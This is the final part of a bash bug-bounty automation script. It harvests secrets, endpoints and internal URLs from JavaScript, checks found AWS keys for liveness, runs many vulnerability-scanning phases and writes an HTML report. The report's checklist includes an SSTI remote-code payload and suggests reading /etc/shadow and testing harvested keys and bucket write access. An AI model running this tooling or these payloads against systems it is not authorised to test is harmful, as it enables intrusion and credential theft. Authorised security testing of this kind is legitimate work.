  SECRET_PATTERNS='(api[_-]?key|secret[_-]?key|access[_-]?token|auth[_-]?token|password|passwd|aws_access|aws_secret|firebase|private[_-]?key|client[_-]?secret|bearer|authorization|apikey|app[_-]?key|app[_-]?secret|consumer[_-]?key|consumer[_-]?secret|oauth[_-]?token|refresh[_-]?token|id[_-]?token|jwt|stripe[_-]?key|sendgrid[_-]?key|twilio|slack[_-]?token|gh[_-]?pat|github[_-]?token|gitlab[_-]?token)\s*[=:]\s*["'\''`]?[A-Za-z0-9+\/=_\-]{8,}'

  if [[ $JS_COUNT -gt 0 ]]; then
    head -100 "$OUT/js/js_files.txt" | while read -r jsurl; do
      content=$(safe_curl "'$jsurl'" 2>/dev/null || true)
      [[ -z "$content" ]] && continue

      # Secrets
      echo "$content" | grep -oiE "$SECRET_PATTERNS" \
        >> "$OUT/js/secrets_raw.txt" 2>/dev/null || true

      # Endpoint extraction
      echo "$content" | grep -oE '"(/api/[a-zA-Z0-9/_\-\.]+)"|'"'(/api/[a-zA-Z0-9/_\-\.]+)'" \
        | tr -d '"'"'" >> "$OUT/js/js_api_endpoints.txt" 2>/dev/null || true

      echo "$content" | grep -oE '"(/[a-zA-Z0-9/_\-\.]{3,})"|'"'(/[a-zA-Z0-9/_\-\.]{3,})'" \
        | tr -d '"'"'" | grep -v "\.png\|\.jpg\|\.gif\|\.css\|\.woff" \
        >> "$OUT/js/js_endpoints.txt" 2>/dev/null || true

      # Hardcoded IPs
      echo "$content" | grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' \
        | grep -v "127.0.0.1\|0.0.0.0\|255.255" \
        >> "$OUT/js/hardcoded_ips.txt" 2>/dev/null || true

      # Internal hosts / staging URLs
      echo "$content" | grep -oE 'https?://[a-zA-Z0-9\-\._]+\.(internal|local|dev|staging|test|corp|intranet)[^"'"'"'\s]*' \
        >> "$OUT/js/internal_urls.txt" 2>/dev/null || true
    done

    # Dedup secrets, strip common false positives
    sort -u "$OUT/js/secrets_raw.txt" 2>/dev/null \
      | grep -v "example\|test\|placeholder\|undefined\|null\|YOUR_" \
      > "$OUT/js/secrets_found.txt" || true

    sort -u "$OUT/js/js_endpoints.txt" -o "$OUT/js/js_endpoints.txt" 2>/dev/null || true
    sort -u "$OUT/js/js_api_endpoints.txt" -o "$OUT/js/js_api_endpoints.txt" 2>/dev/null || true

    SEC_COUNT=$(wc -l < "$OUT/js/secrets_found.txt" 2>/dev/null || echo 0)
    EP_COUNT=$(wc -l < "$OUT/js/js_endpoints.txt" 2>/dev/null || echo 0)
    IP_COUNT=$(wc -l < "$OUT/js/hardcoded_ips.txt" 2>/dev/null || echo 0)
    INT_COUNT=$(wc -l < "$OUT/js/internal_urls.txt" 2>/dev/null || echo 0)

    ok "Potential secrets: $SEC_COUNT"
    ok "JS endpoints: $EP_COUNT"
    ok "Hardcoded IPs: $IP_COUNT"
    ok "Internal URLs: $INT_COUNT"

    [[ $SEC_COUNT -gt 0 ]] && {
      found "JS Secrets: $SEC_COUNT"
      notify "🔑 JS SECRETS — *$SEC_COUNT* found on \`$TARGET\`!"
    }
    [[ $INT_COUNT -gt 0 ]] && found "Internal URLs in JS: $INT_COUNT"

    # Validate API keys (basic liveness check for common services)
    if [[ $SEC_COUNT -gt 0 ]]; then
      ok "Validating discovered API keys..."
      # AWS keys
      grep -oP 'AKIA[0-9A-Z]{16}' "$OUT/js/secrets_found.txt" 2>/dev/null | head -5 | while read -r key; do
        resp=$(curl -s "https://sts.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15" \
          -H "Authorization: AWS4-HMAC-SHA256 Credential=$key" 2>/dev/null || true)
        echo "$resp" | grep -q "InvalidClientTokenId" && \
          warn "AWS key found but invalid: $key" || \
          found "AWS key possibly VALID: $key — verify manually!"
      done
    fi

    export SEC_COUNT EP_COUNT IP_COUNT INT_COUNT
  fi
}

# ═════════════════════════════════════════════════════════════
phase_12() {
# PHASE 12 — HTML REPORT
# ═════════════════════════════════════════════════════════════

  END_TIME=$(date +%s)
  ELAPSED=$((END_TIME - START_TIME))

  # Gather all counts
  LIVE_COUNT=$(wc -l < "$LIVE_URLS" 2>/dev/null || echo 0)
  TOTAL_SUBS=$(wc -l < "$SUBS_ALL" 2>/dev/null || echo 0)
  XSS_COUNT=$(grep -c "POC\|Reflected" "$OUT/xss/dalfox_results.txt" 2>/dev/null || wc -l < "$OUT/xss/reflected_xss.txt" 2>/dev/null || echo 0)
  SSRF_COUNT=$(wc -l < "$OUT/ssrf/confirmed_ssrf.txt" 2>/dev/null || echo 0)
  SQLI_COUNT=$(wc -l < "$OUT/sqli/potential_sqli.txt" 2>/dev/null || echo 0)
  SEC_COUNT="${SEC_COUNT:-$(wc -l < "$OUT/js/secrets_found.txt" 2>/dev/null || echo 0)}"
  BYPASS_COUNT=$(wc -l < "$OUT/fuzzing/403_bypassed.txt" 2>/dev/null || echo 0)
  CORS_COUNT=$(wc -l < "$OUT/cors/cors_issues.txt" 2>/dev/null || echo 0)
  LFI_COUNT=$(wc -l < "$OUT/lfi/confirmed_lfi.txt" 2>/dev/null || echo 0)
  SSTI_COUNT=$(wc -l < "$OUT/ssti/confirmed_ssti.txt" 2>/dev/null || echo 0)
  OR_COUNT=$(wc -l < "$OUT/openredirect/confirmed.txt" 2>/dev/null || echo 0)
  TAKE_COUNT=$(grep -c "VULNERABLE" "$OUT/takeover/subzy_results.json" 2>/dev/null || wc -l < "$OUT/takeover/nuclei_takeover.txt" 2>/dev/null || echo 0)
  BUCKET_COUNT=$(wc -l < "$OUT/cloud/buckets_found.txt" 2>/dev/null || echo 0)
  GQL_COUNT=$(wc -l < "$OUT/graphql/vulnerable.txt" 2>/dev/null || echo 0)
  CRLF_COUNT=$(wc -l < "$OUT/crlf/confirmed_crlf.txt" 2>/dev/null || wc -l < "$OUT/crlf/crlfuzz_results.txt" 2>/dev/null || echo 0)
  CMDI_COUNT=$(wc -l < "$OUT/cmdi/confirmed_cmdi.txt" 2>/dev/null || echo 0)
  TOTAL_VULNS="${TOTAL_VULNS:-0}"; CRIT="${CRIT:-0}"; HIGH="${HIGH:-0}"; MED="${MED:-0}"; LOW="${LOW:-0}"

  REPORT_HTML="$OUT/reports/report.html"
  ALL_FINDINGS_COUNT=$(wc -l < "$OUT/reports/all_findings.txt" 2>/dev/null || echo 0)

  # Build nuclei table rows
  NUCLEI_ROWS=""
  [[ -f "$NUCLEI_OUT" ]] && while IFS= read -r line; do
    sev="info"
    echo "$line" | grep -qi "\[critical\]" && sev="critical"
    echo "$line" | grep -qi "\[high\]" && sev="high"
    echo "$line" | grep -qi "\[medium\]" && sev="medium"
    echo "$line" | grep -qi "\[low\]" && sev="low"
    SAFE_LINE=$(echo "$line" | sed 's/</\&lt;/g;s/>/\&gt;/g')
    NUCLEI_ROWS+="<tr class='sev-$sev'><td>$SAFE_LINE</td></tr>"
  done < "$NUCLEI_OUT"

  cat > "$REPORT_HTML" << HTMLEOF
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Bug Bounty Report — $TARGET</title>
<style>
  :root{--bg:#0d1117;--bg2:#161b22;--bg3:#21262d;--border:#30363d;--text:#e6edf3;--text2:#8b949e;--green:#3fb950;--red:#f85149;--yellow:#d29922;--orange:#e3b341;--blue:#58a6ff;--purple:#bc8cff;--cyan:#76e3ea}
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:var(--bg);color:var(--text);font-family:-apple-system,'Segoe UI',monospace;font-size:14px}
  header{background:var(--bg2);border-bottom:1px solid var(--border);padding:24px 40px;display:flex;align-items:center;gap:16px}
  header h1{font-size:20px;font-weight:600}
  .target{color:var(--blue);font-size:14px;font-weight:400}
  .container{max-width:1400px;margin:0 auto;padding:32px 40px}
  .stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:10px;margin-bottom:32px}
  .stat-card{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:16px;text-align:center}
  .stat-card .num{font-size:28px;font-weight:700;display:block}
  .stat-card .label{color:var(--text2);font-size:11px;margin-top:4px}
  .stat-card.crit .num{color:var(--red)}
  .stat-card.high .num{color:var(--orange)}
  .stat-card.med .num{color:var(--yellow)}
  .stat-card.ok .num{color:var(--green)}
  .stat-card.info .num{color:var(--blue)}
  .stat-card.cyan .num{color:var(--cyan)}
  section{margin-bottom:32px}
  section h2{font-size:15px;font-weight:600;margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px;flex-wrap:wrap}
  .badge{font-size:11px;padding:2px 8px;border-radius:12px;font-weight:500}
  .badge.crit{background:#3d1515;color:var(--red)}
  .badge.high{background:#3d2415;color:var(--orange)}
  .badge.med{background:#3d3015;color:var(--yellow)}
  .badge.ok{background:#153d1e;color:var(--green)}
  .badge.info{background:#0d2039;color:var(--blue)}
  pre{background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:16px;overflow-x:auto;font-size:12px;line-height:1.6;white-space:pre-wrap;word-break:break-all;max-height:350px;overflow-y:auto}
  table{width:100%;border-collapse:collapse;background:var(--bg2);border-radius:8px;overflow:hidden;border:1px solid var(--border)}
  th{background:var(--bg3);padding:10px 14px;text-align:left;font-size:12px;color:var(--text2);font-weight:500}
  td{padding:8px 14px;border-top:1px solid var(--border);font-size:12px;font-family:monospace;word-break:break-all}
  tr.sev-critical td{color:var(--red)}
  tr.sev-high td{color:var(--orange)}
  tr.sev-medium td{color:var(--yellow)}
  tr.sev-low td{color:var(--text2)}
  .meta{color:var(--text2);font-size:12px;margin-bottom:24px;display:flex;gap:24px;flex-wrap:wrap}
  .meta span{display:flex;align-items:center;gap:6px}
  .empty{color:var(--text2);font-style:italic;padding:12px;text-align:center;background:var(--bg2);border-radius:6px;border:1px solid var(--border)}
  .checklist{list-style:none;padding:0}
  .checklist li{padding:8px 12px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px}
  .checklist li::before{content:'☐';color:var(--text2);font-size:16px}
  .checklist li:last-child{border-bottom:none}
  .two-col{display:grid;grid-template-columns:1fr 1fr;gap:16px}
  @media(max-width:800px){.two-col{grid-template-columns:1fr}}
  .finding-row{background:var(--bg2);border:1px solid var(--border);border-radius:6px;padding:10px 14px;margin-bottom:6px;font-size:12px;font-family:monospace}
  .finding-row.critical{border-left:3px solid var(--red)}
  .finding-row.high{border-left:3px solid var(--orange)}
  .finding-row.medium{border-left:3px solid var(--yellow)}
  .finding-row.low{border-left:3px solid var(--text2)}
</style>
</head>
<body>
<header>
  <div style="font-size:32px">🐉</div>
  <div>
    <h1>Bug Bounty Report &nbsp;<span class="target">$TARGET</span></h1>
    <div style="color:var(--text2);font-size:12px;margin-top:4px">
      Generated: $(date '+%Y-%m-%d %H:%M:%S') &nbsp;·&nbsp; Duration: ${ELAPSED}s &nbsp;·&nbsp; Beast Mode v3.0
    </div>
  </div>
</header>

<div class="container">
  <div class="meta">
    <span>🎯 <strong>Target:</strong> $TARGET</span>
    <span>⏱ <strong>Duration:</strong> ${ELAPSED}s</span>
    <span>📁 <strong>Output:</strong> $OUT</span>
    <span>📅 <strong>Date:</strong> $(date '+%Y-%m-%d')</span>
    <span>⭐ <strong>Total Findings:</strong> $ALL_FINDINGS_COUNT</span>
  </div>

  <!-- STATS GRID -->
  <div class="stats-grid">
    <div class="stat-card info"><span class="num">$TOTAL_SUBS</span><div class="label">Subdomains</div></div>
    <div class="stat-card ok"><span class="num">$LIVE_COUNT</span><div class="label">Live Hosts</div></div>
    <div class="stat-card info"><span class="num">$TOTAL_VULNS</span><div class="label">Nuclei Findings</div></div>
    <div class="stat-card crit"><span class="num">${CRIT}</span><div class="label">Critical</div></div>
    <div class="stat-card high"><span class="num">${HIGH}</span><div class="label">High</div></div>
    <div class="stat-card med"><span class="num">${MED}</span><div class="label">Medium</div></div>
    <div class="stat-card high"><span class="num">$XSS_COUNT</span><div class="label">XSS Found</div></div>
    <div class="stat-card high"><span class="num">$SQLI_COUNT</span><div class="label">SQLi Found</div></div>
    <div class="stat-card crit"><span class="num">$SSRF_COUNT</span><div class="label">SSRF Found</div></div>
    <div class="stat-card crit"><span class="num">$LFI_COUNT</span><div class="label">LFI Found</div></div>
    <div class="stat-card high"><span class="num">$SSTI_COUNT</span><div class="label">SSTI Found</div></div>
    <div class="stat-card med"><span class="num">$CORS_COUNT</span><div class="label">CORS Issues</div></div>
    <div class="stat-card high"><span class="num">$OR_COUNT</span><div class="label">Open Redirects</div></div>
    <div class="stat-card med"><span class="num">$SEC_COUNT</span><div class="label">JS Secrets</div></div>
    <div class="stat-card ok"><span class="num">$BYPASS_COUNT</span><div class="label">403 Bypassed</div></div>
    <div class="stat-card crit"><span class="num">$TAKE_COUNT</span><div class="label">Takeover</div></div>
    <div class="stat-card cyan"><span class="num">$BUCKET_COUNT</span><div class="label">Cloud Buckets</div></div>
    <div class="stat-card cyan"><span class="num">$GQL_COUNT</span><div class="label">GraphQL</div></div>
    <div class="stat-card med"><span class="num">$CRLF_COUNT</span><div class="label">CRLF</div></div>
    <div class="stat-card high"><span class="num">$CMDI_COUNT</span><div class="label">Cmd Injection</div></div>
  </div>

  <!-- ALL FINDINGS -->
  <section>
    <h2>⭐ All Findings <span class="badge crit">$ALL_FINDINGS_COUNT total</span></h2>
    <pre>$(cat "$OUT/reports/all_findings.txt" 2>/dev/null || echo "No findings")</pre>
  </section>

  <!-- NUCLEI -->
  <section>
    <h2>🎯 Nuclei <span class="badge crit">${CRIT} critical</span> <span class="badge high">${HIGH} high</span> <span class="badge med">${MED} medium</span></h2>
    $(if [[ "$TOTAL_VULNS" -gt 0 ]]; then
      echo "<table><thead><tr><th>Finding</th></tr></thead><tbody>$NUCLEI_ROWS</tbody></table>"
    else
      echo "<div class='empty'>No Nuclei findings</div>"
    fi)
  </section>

  <!-- VULN SECTIONS 2-COL -->
  <div class="two-col">

    <section>
      <h2>⚡ XSS <span class="badge high">$XSS_COUNT</span></h2>
      <pre>$(cat "$OUT/xss/dalfox_results.txt" 2>/dev/null || cat "$OUT/xss/reflected_xss.txt" 2>/dev/null || echo "No XSS")</pre>
    </section>

    <section>
      <h2>💉 SQLi <span class="badge crit">$SQLI_COUNT</span></h2>
      <pre>$(cat "$OUT/sqli/potential_sqli.txt" 2>/dev/null || echo "No SQLi")</pre>
    </section>

    <section>
      <h2>🌐 SSRF <span class="badge crit">$SSRF_COUNT</span></h2>
      <pre>$(cat "$OUT/ssrf/confirmed_ssrf.txt" 2>/dev/null || echo "No SSRF")</pre>
    </section>

    <section>
      <h2>📂 LFI <span class="badge crit">$LFI_COUNT</span></h2>
      <pre>$(cat "$OUT/lfi/confirmed_lfi.txt" 2>/dev/null || echo "No LFI")</pre>
    </section>

    <section>
      <h2>🔧 SSTI <span class="badge high">$SSTI_COUNT</span></h2>
      <pre>$(cat "$OUT/ssti/confirmed_ssti.txt" 2>/dev/null || echo "No SSTI")</pre>
    </section>

    <section>
      <h2>🔀 CORS <span class="badge med">$CORS_COUNT</span></h2>
      <pre>$(cat "$OUT/cors/cors_issues.txt" 2>/dev/null || echo "No CORS issues")</pre>
    </section>

    <section>
      <h2>↪️ Open Redirect <span class="badge high">$OR_COUNT</span></h2>
      <pre>$(cat "$OUT/openredirect/confirmed.txt" 2>/dev/null || echo "None")</pre>
    </section>

    <section>
      <h2>💻 Cmd Injection <span class="badge high">$CMDI_COUNT</span></h2>
      <pre>$(cat "$OUT/cmdi/confirmed_cmdi.txt" 2>/dev/null || echo "None")</pre>
    </section>

    <section>
      <h2>🏳️ CRLF <span class="badge med">$CRLF_COUNT</span></h2>
      <pre>$(cat "$OUT/crlf/confirmed_crlf.txt" 2>/dev/null || cat "$OUT/crlf/crlfuzz_results.txt" 2>/dev/null || echo "None")</pre>
    </section>

    <section>
      <h2>🔓 403 Bypass <span class="badge ok">$BYPASS_COUNT</span></h2>
      <pre>$(cat "$OUT/fuzzing/403_bypassed.txt" 2>/dev/null || echo "None")</pre>
    </section>

    <section>
      <h2>🌩️ Subdomain Takeover <span class="badge crit">$TAKE_COUNT</span></h2>
      <pre>$(cat "$OUT/takeover/nuclei_takeover.txt" 2>/dev/null; cat "$OUT/takeover/dangling_cnames.txt" 2>/dev/null || echo "None")</pre>
    </section>

    <section>
      <h2>☁️ Cloud Buckets <span class="badge cyan">$BUCKET_COUNT</span></h2>
      <pre>$(cat "$OUT/cloud/buckets_found.txt" 2>/dev/null || echo "None")</pre>
    </section>

    <section>
      <h2>🔍 GraphQL <span class="badge info">$GQL_COUNT</span></h2>
      <pre>$(cat "$OUT/graphql/vulnerable.txt" 2>/dev/null || echo "None")</pre>
    </section>

    <section>
      <h2>🔑 JS Secrets <span class="badge med">$SEC_COUNT</span></h2>
      <pre>$(head -50 "$OUT/js/secrets_found.txt" 2>/dev/null || echo "None")</pre>
    </section>

  </div>

  <!-- HEADERS -->
  <section>
    <h2>🛡️ Security Headers Issues</h2>
    <pre>$(head -30 "$OUT/headers/missing_headers.txt" 2>/dev/null || echo "None")</pre>
  </section>

  <!-- SUBDOMAINS / LIVE -->
  <div class="two-col">
    <section>
      <h2>📡 Subdomains <span class="badge ok">$TOTAL_SUBS</span></h2>
      <pre>$(head -60 "$SUBS_ALL" 2>/dev/null || echo "none")</pre>
    </section>
    <section>
      <h2>🌍 Live Hosts <span class="badge ok">$LIVE_COUNT</span></h2>
      <pre>$(head -40 "$OUT/live/httpx_full.txt" 2>/dev/null || echo "none")</pre>
    </section>
  </div>

  <!-- ENDPOINTS / PORT SCAN -->
  <div class="two-col">
    <section>
      <h2>🕵️ Interesting Endpoints</h2>
      <pre>$(head -30 "$OUT/recon/interesting_endpoints.txt" 2>/dev/null || echo "none")</pre>
    </section>
    <section>
      <h2>🔌 Port Scan</h2>
      <pre>$(grep -E "^[0-9]+/tcp" "$OUT/recon/nmap_results.txt" 2>/dev/null | head -30 || echo "Skipped")</pre>
    </section>
  </div>

  <!-- MANUAL NEXT STEPS -->
  <section>
    <h2>✅ Manual Next Steps</h2>
    <ul class="checklist">
      <li>Load <code>live_urls.txt</code> into Burp Suite for manual testing</li>
      <li>Verify all Nuclei critical/high findings before reporting</li>
      <li>Confirm XSS findings in real browser — check for DOM XSS patterns</li>
      <li>Verify SQLi with <code>sqlmap --dbs</code> on confirmed targets</li>
      <li>Test JS API keys for liveness — use Postman or curl</li>
      <li>Verify LFI — attempt /etc/shadow, /proc/self/environ, log poisoning</li>
      <li>Manually exploit SSTI — attempt RCE: <code>{{config.__class__.__init__.__globals__['os'].popen('id').read()}}</code></li>
      <li>Verify SSRF with your Burp Collaborator or interactsh token</li>
      <li>Test CORS — use browser fetch() with the PoC origin</li>
      <li>Check auth endpoints in <code>401_auth_endpoints.txt</code></li>
      <li>Review screenshots for login pages, admin panels, juicy info</li>
      <li>Verify subdomain takeover by claiming the service</li>
      <li>Test cloud buckets for write access with <code>aws s3 cp</code></li>
      <li>Check GraphQL for sensitive queries and mutations</li>
      <li>Write PoC with CVSS score and impact statement</li>
    </ul>
  </section>

</div>
</body>
</html>
HTMLEOF

  ok "HTML Report → $REPORT_HTML"
  notify "📊 Report ready — $ALL_FINDINGS_COUNT findings ($CRIT crit / $HIGH high)"
}

# ═════════════════════════════════════════════════════════════
# MAIN — RUN ALL PHASES
# ═════════════════════════════════════════════════════════════

run_phase "phase1"        "PHASE 1 — Subdomain Enumeration"       phase_1
run_phase "phase_dns"     "PHASE 1.5 — DNS Recon"                 phase_dns
run_phase "phase2"        "PHASE 2 — Live Host Probing"           phase_2
run_phase "phase_headers" "PHASE 2.5 — Security Headers"          phase_security_headers
run_phase "phase3"        "PHASE 3 — Screenshots"                 phase_3
run_phase "phase4"        "PHASE 4 — Port Scan"                   phase_4
run_phase "phase5"        "PHASE 5 — URL Collection"              phase_5
run_phase "phase_crawl"   "PHASE 5.5 — Web Crawling"              phase_crawl
run_phase "phase_params"  "PHASE 5.6 — Parameter Discovery"       phase_params
run_phase "phase6"        "PHASE 6 — Directory Fuzzing"           phase_6
run_phase "phase_vhost"   "PHASE 6.5 — Virtual Host Fuzzing"      phase_vhost
run_phase "phase7"        "PHASE 7 — XSS Scanning"                phase_7
run_phase "phase_or"      "PHASE 7.5 — Open Redirect"             phase_open_redirect
run_phase "phase8"        "PHASE 8 — SQL Injection"               phase_8
run_phase "phase_lfi"     "PHASE 8.5 — LFI / Path Traversal"      phase_lfi
run_phase "phase9"        "PHASE 9 — SSRF Detection"              phase_9
run_phase "phase_cors"    "PHASE 9.1 — CORS Misconfiguration"     phase_cors
run_phase "phase_ssti"    "PHASE 9.2 — SSTI Detection"            phase_ssti
run_phase "phase_hosthdr" "PHASE 9.3 — Host Header Injection"     phase_host_header
run_phase "phase_crlf"    "PHASE 9.4 — CRLF Injection"            phase_crlf
run_phase "phase_xxe"     "PHASE 9.5 — XXE Injection"             phase_xxe
run_phase "phase_cmdi"    "PHASE 9.6 — Command Injection"         phase_cmdi
run_phase "phase_smuggle" "PHASE 9.7 — HTTP Request Smuggling"    phase_smuggling
run_phase "phase_takeover" "PHASE 9.8 — Subdomain Takeover"       phase_takeover
run_phase "phase_cloud"   "PHASE 9.9 — Cloud Storage Enum"        phase_cloud
run_phase "phase_graphql" "PHASE 9.10 — GraphQL Introspection"    phase_graphql
run_phase "phase_ws"      "PHASE 9.11 — WebSocket Detection"      phase_websocket
run_phase "phase10"       "PHASE 10 — Nuclei Scan"                phase_10
run_phase "phase11"       "PHASE 11 — JS Analysis"                phase_11
run_phase "phase12"       "PHASE 12 — HTML Report"                phase_12

# ── Final Summary ─────────────────────────────────────────────
END_TIME=$(date +%s)
ELAPSED=$((END_TIME - START_TIME))
LIVE_COUNT=$(wc -l < "$LIVE_URLS" 2>/dev/null || echo 0)
TOTAL_SUBS=$(wc -l < "$SUBS_ALL" 2>/dev/null || echo 0)
ALL_FINDINGS=$(wc -l < "$OUT/reports/all_findings.txt" 2>/dev/null || echo 0)

echo ""
echo -e "${BOLD}${GREEN}"
echo "╔══════════════════════════════════════════════════════════╗"
echo "║              BEAST MODE COMPLETE 🐉  v3.0               ║"
echo "╠══════════════════════════════════════════════════════════╣"
printf "║  %-20s %-35s║\n" "Target:"       "$TARGET"
printf "║  %-20s %-35s║\n" "Subdomains:"   "$TOTAL_SUBS"
printf "║  %-20s %-35s║\n" "Live hosts:"   "$LIVE_COUNT"
printf "║  %-20s %-35s║\n" "Total findings:" "$ALL_FINDINGS"
printf "║  %-20s %-35s║\n" "Nuclei vulns:"  "${TOTAL_VULNS:-0} (${CRIT:-0} crit / ${HIGH:-0} high)"
printf "║  %-20s %-35s║\n" "XSS:"          "${XSS_COUNT:-0}"
printf "║  %-20s %-35s║\n" "SQLi:"         "${SQLI_COUNT:-0}"
printf "║  %-20s %-35s║\n" "SSRF:"         "${SSRF_COUNT:-0}"
printf "║  %-20s %-35s║\n" "LFI:"          "${LFI_COUNT:-0}"
printf "║  %-20s %-35s║\n" "SSTI:"         "${SSTI_COUNT:-0}"
printf "║  %-20s %-35s║\n" "CORS:"         "${CORS_COUNT:-0}"
printf "║  %-20s %-35s║\n" "Open Redirect:" "${OR_COUNT:-0}"
printf "║  %-20s %-35s║\n" "Cmd Injection:" "${CMDI_COUNT:-0}"
printf "║  %-20s %-35s║\n" "CRLF:"         "${CRLF_COUNT:-0}"
printf "║  %-20s %-35s║\n" "JS Secrets:"   "${SEC_COUNT:-0}"
printf "║  %-20s %-35s║\n" "403 Bypassed:" "${BYPASS_COUNT:-0}"
printf "║  %-20s %-35s║\n" "Subdomain TKO:" "${TAKE_COUNT:-0}"
printf "║  %-20s %-35s║\n" "Cloud Buckets:" "${BUCKET_COUNT:-0}"
printf "║  %-20s %-35s║\n" "GraphQL:"      "${GQL_COUNT:-0}"
printf "║  %-20s %-35s║\n" "Duration:"     "${ELAPSED}s"
echo "╠══════════════════════════════════════════════════════════╣"
printf "║  %-54s║\n" "📊 Report: $OUT/reports/report.html"
printf "║  %-54s║\n" "📁 Output: $OUT"
echo "╚══════════════════════════════════════════════════════════╝"
echo -e "${NC}"
